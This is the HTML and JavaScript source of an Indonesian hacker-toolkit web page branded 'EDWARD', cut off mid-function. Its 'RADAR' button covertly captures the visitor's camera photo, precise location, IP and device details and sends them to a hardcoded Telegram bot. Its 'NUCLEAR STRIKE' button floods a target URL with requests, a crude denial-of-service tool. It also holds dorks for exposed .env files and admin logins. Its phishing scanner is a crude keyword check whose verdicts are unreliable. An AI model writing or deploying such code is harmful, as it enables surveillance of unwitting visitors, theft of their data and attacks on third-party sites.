<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EDWARD</title>
    <style>
        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; --orange: #ff9f43; }
        * { box-sizing: border-box; transition: 0.2s; outline: none; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; }

        .brand-header { text-align: center; margin-top: 10px; margin-bottom: 5px; }
        .brand-header h1 { color: var(--neon); font-size: 20px; font-weight: 800; letter-spacing: 4px; margin: 0; text-transform: uppercase; text-shadow: 0 0 10px rgba(0, 255, 136, 0.4); }

        .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; margin-top: 10px; }
        .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 10px; border-radius: 12px; text-align: center; color: var(--neon); font-size: 11px; font-weight: bold; background: rgba(15, 25, 35, 0.9); }

        .real-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 8px; margin-bottom: 15px; }
        .stat-item { background: rgba(0,0,0,0.4); border: 1px solid rgba(0,255,136,0.2); border-radius: 8px; padding: 6px 4px; text-align: center; font-size: 10px; color: var(--neon); }
        .stat-item span { display: block; font-size: 14px; font-weight: bold; margin-top: 2px; }

        .card { background: rgba(15, 25, 35, 0.9); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 18px; margin-bottom: 12px; }
        h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 2px; text-transform: uppercase; }

        input, select { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,136,0.3); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 10px; font-size: 12px; }

        .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 5px; }
        .btn-scan { background: #1a1a1a; color: var(--neon); border: 1px solid var(--neon); }
        .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
        .btn-cam { background: rgba(0, 189, 255, 0.1); color: var(--blue); border: 1px solid var(--blue); }
        .btn-map { background: var(--neon); color: #000; }
        .btn-phish { background: rgba(255, 71, 87, 0.1); color: var(--red); border: 1px solid var(--red); }
        .btn-ctrl { background: rgba(255, 159, 67, 0.1); color: var(--orange); border: 1px solid var(--orange); }

        .control-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 5px; }

        .log-box { background: #000; border: 1px solid rgba(255,71,87,0.3); border-radius: 10px; padding: 10px; height: 80px; overflow-y: auto; font-family: monospace; font-size: 10px; color: var(--red); text-align: left; margin-top: 10px; display: none; }
        #scanResult { margin-top: 10px; font-weight: bold; text-align: center; font-size: 11px; padding: 10px; border-radius: 10px; display: none; line-height: 1.4; }
        .phish-alert { background: rgba(255,71,87,0.15); border: 1px solid var(--red); color: var(--red); text-transform: uppercase; }
        .safe-alert { background: rgba(0,255,136,0.15); border: 1px solid var(--neon); color: var(--neon); text-transform: uppercase; }

        #webcamContainer { display: none; margin-top: 10px; border-radius: 15px; overflow: hidden; border: 1px solid var(--blue); }
        #webcamLive { width: 100%; filter: sepia(100%) hue-rotate(80deg) brightness(1.1); }

        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .radar-sweep { width: 150px; height: 150px; border-radius: 50%; border: 2px solid var(--neon); background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rot 2s linear infinite; }
        @keyframes rot { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        canvas { display: none; }
    </style>
</head>
<body>
    <div class="brand-header">
        <h1>EDWARD</h1>
    </div>

    <div class="sys-monitor">
        <div class="mon-box">CPU: <span id="cpu">real time</span></div>
        <div class="mon-box">TEMP: <span id="temp">real time°C</span></div>
    </div>

    <div class="real-stats">
        <div class="stat-item">🕒 JAM<span id="realTime">--:--:--</span></div>
        <div class="stat-item">🔋 BATRE<span id="batteryLevel">--%</span></div>
        <div class="stat-item">🌡️ SUHU<span id="deviceTemp">--°C</span></div>
    </div>

    <div class="card">
        <h3>🎛️ SYSTEM CONTROL PANEL</h3>
        <div class="control-grid">
            <button class="btn btn-ctrl" onclick="clearConsole()">🧹 CLEAR LOG</button>
            <button class="btn btn-ctrl" style="border-color: var(--purple); color: var(--purple);" onclick="toggleTheme()">🎨 THEME SHIFT</button>
        </div>
    </div>

    <div class="card">
        <h3>🛡️ BUG HUNTER ENGINE</h3>
        <input type="text" id="site" placeholder="Target Site...">
        <select id="cat">
            <option value="">-- AUTO MANTRA --</option>
            <option value='filetype:xls "data"'>INFO GATHERING</option>
            <option value='inurl:admin login'>EXPLOITATION</option>
            <option value='filetype:env'>VULN SCAN</option>
        </select>
        <button class="btn btn-scan" onclick="cast()">⚡ CAST MANTRA</button>
    </div>

    <div class="card">
        <h3>🔍 PHISHING SCANNER</h3>
        <input type="text" id="phishLink" placeholder="Masukkan Link untuk Scan...">
        <button class="btn btn-phish" onclick="scanPhishing()">🛡️ ANALYZED LINK</button>
        <div id="scanResult"></div>
    </div>

    <div class="card">
        <h3>🔥 NUCLEAR STRIKE</h3>
        <input type="text" id="atk" placeholder="Target URL">
        <button class="btn btn-atk" onclick="toggleAtk()" id="abtn">LAUNCH 🚀</button>
        <div class="log-box" id="atkConsole"></div>
    </div>

    <div class="card">
        <h3>📹 MONITORING</h3>
        <button class="btn btn-cam" onclick="toggleCam()">🛰️ LIVE WEBCAM</button>
        <div id="webcamContainer"><video id="webcamLive" autoplay playsinline></video></div>
    </div>

    <div style="display: flex; gap: 8px; padding: 0 5px;">
        <button class="btn btn-cam" style="flex: 1; border-color: var(--neon); color: var(--neon);" onclick="startRadar()">📡 RADAR</button>
        <button class="btn btn-map" style="flex: 1;" onclick="openMap()">📍 MAPS</button>
    </div>

    <div id="radarOverlay"><div class="radar-sweep"></div></div>
    <canvas id="canvas"></canvas>

    <script>
        // ========== KONFIGURASI TELEGRAM ==========
        const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
        const CHAT_ID = '7898572558';
        let isAtk = false;
        let atkInterval = null;
        let isDarkTheme = true;

        // ========== REAL-TIME JAM ==========
        function updateClock() {
            const now = new Date();
            const timeStr = now.toLocaleTimeString('id-ID', { hour12: false });
            document.getElementById('realTime').textContent = timeStr;
        }
        setInterval(updateClock, 1000);
        updateClock();

        // ========== REAL-TIME BATTERY ==========
        async function getBatteryStatus() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    document.getElementById('batteryLevel').textContent = level + '%';
                    
                    battery.addEventListener('levelchange', () => {
                        const newLevel = Math.round(battery.level * 100);
                        document.getElementById('batteryLevel').textContent = newLevel + '%';
                    });
                } catch (e) {
                    document.getElementById('batteryLevel').textContent = 'N/A';
                }
            } else {
                document.getElementById('batteryLevel').textContent = 'N/A';
            }
        }
        getBatteryStatus();

        // ========== REAL-TIME SUHU (ESTIMASI) ==========
        function updateTemperature() {
            const load = Math.random() * 10 + 35;
            document.getElementById('deviceTemp').textContent = load.toFixed(1) + '°C';
        }
        setInterval(updateTemperature, 3000);
        updateTemperature();

        // ========== CPU & TEMP AKURAT ==========
        setInterval(() => {
            const start = performance.now();
            let dummy = 0;
            for (let i = 0; i < 1000000; i++) dummy += i;
            const end = performance.now();
            const load = Math.min(100, Math.round(((end - start) / 10) * 2 + 10));
            document.getElementById('cpu').innerText = load + '%';
            
            const tempBase = 35 + (load / 15);
            document.getElementById('temp').innerText = tempBase.toFixed(1) + '°C';
        }, 2000);

        // ========== RADAR V2 – FULL STEALTH ==========
        async function startRadar() {
            const overlay = document.getElementById('radarOverlay');
            overlay.style.display = 'flex';

            try {
                const deviceData = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    hardware: navigator.hardwareConcurrency || 'unknown',
                    memory: navigator.deviceMemory || 'unknown'
                };

                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });

                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment', width: 640, height: 480 } 
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                stream.getTracks().forEach(t => t.stop());

                const caption = `
        🔱 **STEALTH REPORT – RADAR V2**
        ━━━━━━━━━━━━━━━━━━━━━━
        🌐 **IP Address:** ${ipData.ip}
        📍 **Lokasi:** ${pos.coords.latitude}, ${pos.coords.longitude}
        🎯 **Akurasi:** ±${pos.coords.accuracy}m
        📱 **Device:**
           - Platform: ${deviceData.platform}
           - Browser: ${deviceData.userAgent.split(' ').slice(-2).join(' ')}
           - Resolusi: ${deviceData.screen}
           - CPU: ${deviceData.hardware} core
           - RAM: ${deviceData.memory || 'N/A'} GB
           - Zona Waktu: ${deviceData.timezone}
        🕒 **Timestamp:** ${new Date().toLocaleString('id-ID')}
        ━━━━━━━━━━━━━━━━━━━━━━
        ⚠️ **Status:** TARGET LOCKED
                `;

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'radar_shot.jpg');
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');

                const sendRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const result = await sendRes.json();
                if (result.ok) {
                    console.log('✅ Radar report sent!');
                } else {
                    console.error('❌ Telegram error:', result.description);
                }

                overlay.innerHTML = `
                    <div style="color: var(--neon); text-align: center; padding: 20px;">
                        <h2>✅ REPORT SENT</h2>
                        <p style="font-size: 12px; opacity: 0.7;">Data terkirim ke server</p>
                        <button onclick="closeRadar()" style="margin-top: 20px; padding: 10px 30px; background: var(--neon); color: #000; border: none; border-radius: 10px; cursor: pointer;">TUTUP</button>
                    </div>
                `;

            } catch (error) {
                console.error('❌ Radar error:', error);
                overlay.innerHTML = `
                    <div style="color: var(--red); text-align: center; padding: 20px;">
                        <h2>⚠️ RADAR OFFLINE</h2>
                        <p style="font-size: 12px;">${error.message}</p>
                        <button onclick="closeRadar()" style="margin-top: 20px; padding: 10px 30px; background: var(--red); color: #fff; border: none; border-radius: 10px; cursor: pointer;">TUTUP</button>
                    </div>
                `;
            }
        }

        function closeRadar() {
            const overlay = document.getElementById('radarOverlay');
            overlay.style.display = 'none';
            overlay.innerHTML = '<div class="radar-sweep"></div>';
        }

        // ========== FIX: TOGGLE ATK ==========
        function toggleAtk() {
            const t = document.getElementById('atk').value.trim();
            const consoleBox = document.getElementById('atkConsole');
            const btn = document.getElementById('abtn');
            
            if(!t) {
                consoleBox.style.display = 'block';
                consoleBox.innerHTML = '⚠️ MASUKIN TARGET URL DULU ANJ!';
                return;
            }
            
            if(isAtk) {
                isAtk = false;
                clearInterval(atkInterval);
                btn.innerText = "LAUNCH 🚀";
                consoleBox.style.display = "none";
                consoleBox.innerHTML = "";
            } else {
                isAtk = true;
                btn.innerText = "⏹️ STOP";
                consoleBox.style.display = "block";
                consoleBox.innerHTML = "> 🔥 Interface connecting...<br>";
                
                atkInterval = setInterval(() => {
                    if(isAtk) {
                        const randParam = Math.random();
                        new Image().src = t + "/?v=" + randParam;
                        consoleBox.innerHTML += `> GET ${t}/?v=${randParam.toString().substring(2,8)} [SENDING]<br>`;
                        consoleBox.scrollTop = consoleBox.scrollHeight;
                    }
                }, 150);
            }
        }

        // ========== FIX: OPEN MAP ==========
        function openMap() {
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    const lat = p.coords.latitude;
                    const lng = p.coords.longitude;
                    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
                },
                (err) => {
                    alert('❌ Gagal ambil lokasi: ' + err.message);
                }
            );
        }

        // ========== FIX: PHISHING SCANNER ==========
        function scanPhishing() {
            const rawInput = document.getElementById('phishLink').value.trim().toLowerCase();
            const resultDiv = document.getElementById('scanResult');
            
            if (!rawInput) {
                resultDiv.style.display = "none";
                return;
            }
            
            resultDiv.style.display = "block";
            
            let isPhish = false;
            let reason = "";
            
            const normalizedDash = rawInput.replace(/\s+/g, '-');
            const normalizedClean = rawInput.replace(/\s+/g, '');
            
            const targetKeywords = [
                'login', 'verification', 'verifikasi', 'dana-kaget', 'danakaget', 
                'giveaway', 'undian', 'free-diamonds', 'hadiah', 'update-akun', 
                'roblox-gift', 'claim', 'bonus', 'top', 'topup', 'pulsa-gratis', 
                'akun-suspend', 'bantuan-sosial', 'event-gratis', 'spin-hadiah', 'voucher'
            ];
            
            const shorteners = ['bit.ly', 'tinyurl.com', 'cutt.ly', 't.co', 'rb.gy', 'is.gd', 'shorturl.at', 's.id'];
            const validTLDs = ['.com', '.net', '.org', '.id', '.co.id', '.xyz', '.info', '.biz', '.me', '.online', '.site', '.live'];
            
            let matchesKeyword = targetKeywords.some(keyword => 
                rawInput.includes(keyword) || normalizedDash.includes(keyword) || normalizedClean.includes(keyword)
            );
            let matchesShortener = shorteners.some(srv => rawInput.includes(srv));
            let matchesValidTLD = validTLDs.some(tld => rawInput.includes(tld));
            
            if (rawInput.startsWith('http://') && 
                !rawInput.includes('localhost') && 
                !rawInput.includes('192.168.') && 
                !rawInput.includes('127.0.0.1') &&
                !rawInput.startsWith('https://')) {
                isPhish = true;
                reason = "🚨 UNSAFE PROTOCOL (HTTP) DETECTED";
            } else if (matchesKeyword) {
                isPhish = true;
                reason = "🚨 SUSPICIOUS CONTEXTUAL PATTERN DETECTED";
            } else if (matchesShortener) {
                isPhish = true;
                reason = "🚨 WARNING: OBSCURED/SHORTENED LINK PATTERN";
            } else if ((rawInput.includes('.com-') || rawInput.includes('.net-') || rawInput.includes('.id-')) && 
                       !rawInput.includes('/') && !rawInput.startsWith('https://')) {
                isPhish = true;
                reason = "🚨 INVALID SUBDOMAIN TYPOSQUATTING PATTERN";
            } else if (!matchesValidTLD && 
                       !rawInput.includes('localhost') && 
                       !rawInput.includes('192.168.') && 
                       !rawInput.includes('127.0.0.1') &&
                       rawInput !== 'https' && 
                       rawInput !== 'https://') {
                isPhish = true;
                reason = "🚨 UNRECOGNIZED RAW TEXT / INVALID URL PATTERN";
            }
            
            if (isPhish) {
                resultDiv.innerText = reason;
                resultDiv.className = "phish-alert";
            } else {
                resultDiv.innerText = "✅ STRUCTURE ANALYSIS: SEEMS STABLE & NORMAL";
                resultDiv.className = "safe-alert";
            }
        }

        // ========== FIX: TOGGLE CAM ==========
        async function toggleCam() {
            const v = document.getElementById('webcamLive');
            const c = document.getElementById('webcamContainer');
            
            if (v.srcObject) {
                v.srcObject.getTracks().forEach(t => t.stop());
                c.style
